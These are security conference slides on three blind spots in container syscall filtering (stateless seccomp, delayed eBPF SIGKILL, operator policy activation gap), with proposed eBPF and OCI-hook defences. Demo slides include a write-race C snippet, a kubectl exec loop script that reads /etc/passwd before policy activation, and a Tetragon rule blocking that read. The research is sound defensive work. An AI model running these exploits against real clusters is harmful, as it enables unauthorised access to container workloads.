---
title: "Beyond Seccomp Breaking and Rebuilding Syscall Filtering for Microservices"
speakers: ["Jin Her", "Chihyeon Cho", "Jaehyun Nam", "Seungsoo Lee"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Jin Her&Chihyeon Cho&Jaehyun Nam&Seungsoo Lee_Beyond Seccomp Breaking and Rebuilding Syscall Filtering for Microservices.pdf"
pages: 24
sha256: "f42b566cbbee32810c655a168c44d4ee08310dfeb77d9773faadc92207661f6a"
text_chars: 9780
ocr_pages: 4
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.6
ocr_unreliable_blocks: 0
vision_verified_pages_changed: 23
vision_verified_pages: 24
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:35:29Z"
---
# Beyond Seccomp Breaking and Rebuilding Syscall Filtering for Microservices

**Speakers:** Jin Her, Chihyeon Cho, Jaehyun Nam, Seungsoo Lee  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Jin Her&Chihyeon Cho&Jaehyun Nam&Seungsoo Lee_Beyond Seccomp Breaking and Rebuilding Syscall Filtering for Microservices.pdf` (24 pages)


## Slide 1

# Beyond Seccomp: Breaking and Rebuilding Syscall Filtering for Microservices

Jin Her<sup>1</sup> , Chihyeon Cho<sup>1</sup> , Jaehyun Nam<sup>2</sup> , Seungsoo Lee<sup>1</sup> 1Incheon National University, 2Dankook University gjwls0787@inu.ac.kr, gsm07231@inu.ac.kr, namjh@dankook.ac.kr, seungsoo@inu.ac.kr

## Slide 2

## Speakers and Contributors

**Jin Her (Speaker)**

- MS Student
- Incheon National University

**Research Focus**

- eBPF-based security
- container security

**Chihyeon Cho (Speaker)**

- MS Student
- Incheon National University

**Research Focus**

- confidential computing
- container security

**Jaehyun Nam (Contributor)**

- Assistant Professor
- Dankook University

**Research Focus**

- networked systems security
- container security

**Seungsoo Lee (Contributor)**

- Associate Professor
- Incheon National University

**Research Focus**

- Secure cloud
- network systems

## Slide 3

## Contents

1. Introduction
2. Background
3. Vulnerability
4. Exploit
5. Defense
6. Conclusion
7. Q&A

## Slide 4

## Container Environment & Microservice

- Containers are the basic unit of microservices
- Unlike VMs, containers share the host kernel
  - ✓ Syscall security becomes **critical** in container environment

< Virtualization >

| VM | VM |
| App | App |
| syscall() | syscall() |
| Guest Kernel | Guest Kernel |

Hypervisor

Host Kernel

Infrastructure

< Containerization >

| Container | Container |
| App | App |
| Container Engine | syscall() |

Host Kernel

Infrastructure

## Slide 5

## Current Syscall Defense: Syscall Filtering

- One of the main approaches to syscall security
- limit the syscalls that a target can use

[Syscall Policy]

allowed :
access,
close
denied :
connect,
read
…

Container | Container
App | App
Container Engine | syscall()
Syscall Filter
Host Kernel | Allow syscall
Infrastructure

Block Syscall

## Slide 6

## Current Syscall Defense: Static Filter

- Seccomp-BPF as the dominant syscall blocking mechanism
- Static profile after container startup
  - ✓ no runtime policy update
  - ➢ motivates **dynamic enforcement**

Admin
Can't update

Seccomp Profile

Container
App
syscall()

User Space
Kernel Space

Syscall Interface

Block syscall() with Error Return

Seccomp-BPF Program

Raw_tracepoint

Allow syscall()

Actual Syscall Execution

## Slide 7

## Current Syscall Defense: Dynamic Filter

- eBPF enables programmable logic inside the kernel without kernel modification
- eBPF-based runtime enforcement stores policy state in eBPF maps → Policies can be updated during runtime
- If a violation is detected:
  - ✓ send a **SIGKILL signal** to terminate the process

Container
App
syscall()

User Space
Kernel Space

Syscall Interface

Seccomp-BPF Program

raw_tracepoint

Actual Syscall Execution

Admin
Update

Send SIGKILL

eBPF Maps

eBPF Programs

## Slide 8

## Policy Application in Microservice

- Kubernetes orchestrates container deployment across distributed resources
- Operators are commonly used to apply workload-specific policies in Kubernetes

Control Plane
Container Runtime
Container

Informer
Operator

eBPF Maps
Container Identifier
Policy

: Policy Deployed
: Pod Deployed

## Slide 9

## Overview: Three Structural Blind Spots

Three structural blind spots :

- Seccomp-BPF → **Stateless filter**
- eBPF based enforcement → **Reactive Dely**
- Operator-based loading → **Asynchronous Policy Activation**

When applying a seccomp filter

Container
App
User Space
syscall()
Kernel Space

Seccomp Profile
"defaultAction": ”scmp_act_errno",
"syscalls": [
  "names": [
    "read", "write", "open", …

#1
Seccomp-BPF

When applying an eBPF filter

Kubernetes API
Operator
Container
#3
#2
eBPF Maps
eBPF Programs

## Slide 10

## Blind Spot 1: Stateless Filtering

- Allowlist-based filters check syscalls independently
- Each syscall may be allowed in isolation
  - ➢ Sequential attacks using **allowed syscalls** cannot be blocked

Attacker
exploit payload
Container
Web Server
connect to the C&C
Attacker C&C Server

Seccomp Profile
[Allowlist]
access(), close(),
**connect()**, **read()**,
socket(), getuid(),
…

: normal flow
: malicious flow

Partial Runtime Syscall Flow

access()  connect()  close()
⋮
getuid()  socket()  read()

## Slide 11

## Blind Spot 2: Reactive Delay

- SIGKILL does not always interrupt the syscall in progress
- For many syscalls, signal handling occurs on the **return path** (ex. write, sendto, kill, etc.)
  - ➢ Actual syscall execution may complete before group exit

Container
App
User Space
syscall()
Kernel Space

raw_tracepoint
eBPF Programs

Actual Syscall Execution
eBPF Maps

set flag
“task_struct”: {
“signal”: { SIGNAL_GROUP_EXIT = 1 }}
check flag

Return Loop
raw_tracepoint → signal check → return to user → group exit

## Slide 12

## Blind Spot 3: Asynchronous Policy Activation

- Operator policy loading runs in parallel with container creation
- Policy state is installed **after pod events are observed**
  - ➢ Creates a security gap until policy activation

Control Plane | Container Runtime | Container | Operator

Create Container
Start Container
Apply Pod Manifest
Container Execution Time
Policy Activation Gap ( ≒ 1sec)
Activate Policy

## Slide 13

## Real-World Target Environment Setup

Experimental Environment

| Category | Configuration |
| --- | --- |
| Cluster | **Kubernetes** v1.30.14, single-node |
| Tetragon | **v1.1.0** |
| Runtime | containerd v1.7.24 |
| Kernel | Linux v5.15 |

Attack Demo

| Demo | Blind Spot | Environment | Success Condition |
| --- | --- | --- | --- |
| #1 | Stateless filtering | Kubernetes + Seccomp profile | Log4j chain succeeds with allowed syscalls |
| #2 | Reactive delay | Host-level eBPF test | Process killed, but write completed |
| #3 | Initialization gap | Kubernetes + Tetragon-1.4.0 | cat succeeds before policy activation |

## Slide 14

## Demo 1: Evading Stateless Filters

- Stateless filter’s not sufficient to protect a container

Protected by Seccomp
Container
Vulnerable Web Server
Malicious Payload
Reverse Shell
Attacker

GoFinance
The most popular peer to peer lending at SEA
Read More
Hello Again!
Welcome Back
Username
Password
Login
Forgot Password ?

Observed System Call List

```
cclab@demo:~/Demo/syscall_monitor$ sed -n '2063,2083p' syscall_trace_clean.log
cclab@demo:~/Demo/syscall_monitor$ head -n 30 /var/lib/kubelet/seccomp/profiles/web-server-profile.json
```

## Slide 15

## Demo 2: Exploiting Delayed Termination

**enforcer.c**

```c
SEC("tracepoint/raw_syscalls/sys_enter")
int rtp_sys_enter(struct trace_event_raw_sys_enter *ctx)
{
    ...

    if (current_syscall != target_syscall)
        return 0;

    fd = (__s32)ctx->args[0];
    if (!read_fd_basename(fd, actual_name))
        return 0;

    if (!str_matches(target_name, actual_name))
        return 0;

    ...

    bpf_send_signal(SIGKILL);
    return 0;
}
```

**exploit.c**

```c
fd = open(argv[1], O_WRONLY | O_CREAT | O_TRUNC | O_DIRECT, 0600);
if (fd < 0) {
    perror("open");
    return 1;
}

memset(buf, 0, size);
strncpy(buf, argv[2], size - 1);

fprintf(stderr, "[victim] writing %zu bytes to %s\n", size, argv[1]);
written = write(fd, buf, size);
if (written < 0) {
    perror("write");
} else {
    fprintf(stderr, "[victim] write returned %zd\n", written);
}
```

## Slide 16

## Demo 2: Exploiting Delayed Termination

```
root@nginx:/#
cclab@demo:~/Demo/2_sigkill$
```

## Slide 17

## Demo 3: Exploiting the Initialization Gap

**Tetragon policy**

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-open-etc-passwd
spec:
  podSelector:
    matchLabels:
      app: nginx
  kprobes:
  - call: "sys_openat"
    syscall: true
    args:
    - index: 0
      type: "int"
    - index: 1
      type: "string"
    - index: 2
      type: "int"
    selectors:
    - matchArgs:
      - index: 1
        operator: "Equal"
        values:
        - "/etc/passwd"
      matchActions:
      - action: Sigkill
```

- Applied Policy
  - SIGKILL at “sys_openat” hook point

```
cclab@demo:~/Demo/3_operator$ kubectl get pods -n kube-system tetragon-q5t4h
NAME              READY    STATUS      RESTARTS       AGE
tetragon-q5t4h    2/2      Running     2 (2d2h ago)   2d10h
cclab@demo:~/Demo/3_operator$ kubectl get tracingpolicy
NAME                     AGE
block-open-etc-passwd    4m26s
```

Tetragon policy

## Slide 18

## Demo 3: Exploiting the Initialization Gap

exploit.sh

```bash
#!/bin/bash

NAMESPACE="default"
POD_NAME="nginx"

echo "[*] Spamming kubectl exec..."

while true; do
  kubectl exec -n "$NAMESPACE" "$POD_NAME" -- \
    cat /etc/passwd 2>/dev/null

  EXIT_CODE=$?

  if [[ $EXIT_CODE -eq 0 ]]; then
    echo "[!!] Attack SUCCESS"
    exit 0
  fi
done
```

```
cclab@demo:~/Demo/3_operator$ kubectl apply -f nginx.yaml
cclab@demo:~/Demo/3_operator$ ./exploit.sh
```

## Slide 19

## Defense : Stateful filtering

- Look up the **previous syscall** from the eBPF map
- Validate the syscall sequence using the syscall graph
- Detect invalid syscall sequences before enforcement

Container
App (TID: 2)
execve(59)
User Space
Kernel Space

raw_tracepoint
eBPF Programs
eBPF Maps

Previous Syscall Map

| Thread ID | 1 | 2 |
| --- | --- | --- |
| Previous Syscall | recvfrom(45) | sched_yield(24) |

Syscall Graph Map

| Container ID, Previous Syscall | 2, 24 | 1, 31 |
| --- | --- | --- |
| Allowed Syscalls | sys_getitimer(36) | 24, 45 |

## Slide 20

## Defense : Preemptive Blocking

- SIGKILL response can be too late
- LSM-BPF blocks inline by returning an error at hook points
- But LSM hooks are not one-to-one syscall filters

execve(59) triggered in tid 2

raw_tracepoint
LSM Hooks
security_bprm_check_security()
return Error

eBPF Programs
eBPF Programs
eBPF Maps

Triggered Syscall Map

| Thread ID | 1 | 2 |
| --- | --- | --- |
| Triggered Syscall, Action | recvfrom(45), allow | execve(59), block |

## Slide 21

## Defense : Atomic Policy Installation

- Requirements
  - Detect container creation events
  - **Prevent container startup** until policy installation completes

→ **OCI Prestart Hook**

Time

t₀    t₁    t₂    t₃

Kubernetes Control Plane
Container Runtime
OCI Prestart Hook

Start Container / Execute Entrypoint
Initialization Gap
Install Policy

- Create namespace
- Create file system
- Populate **eBPF Map**
- Initialization phase start
- Populate **eBPF Map**

## Slide 22

## Key Takeaways

- Three key limitations of current syscall filtering
- Design directions for next-generation syscall filtering

| Stateless filtering | Reactive Delay | Initialization gap |
| --- | --- | --- |
| eBPF-based stateful syscall filtering | Inline preemptive blocking | Atomic policy installation |

## Slide 23

## Q&A

## Slide 24

## Acknowledgement

- This work was supported by the National Research Foundation of Korea(NRF) grant funded by the Korea government(MSIT)(No. RS-2025-16069415).
- This work was supported by the IITP(Institute of Information & Communications Technology Planning & Evaluation)-ICAN(ICT Challenge and Advanced Network of HRD) grant funded by the Korea government(Ministry of Science and ICT)(IITP-2026-RS-2024-00437024)

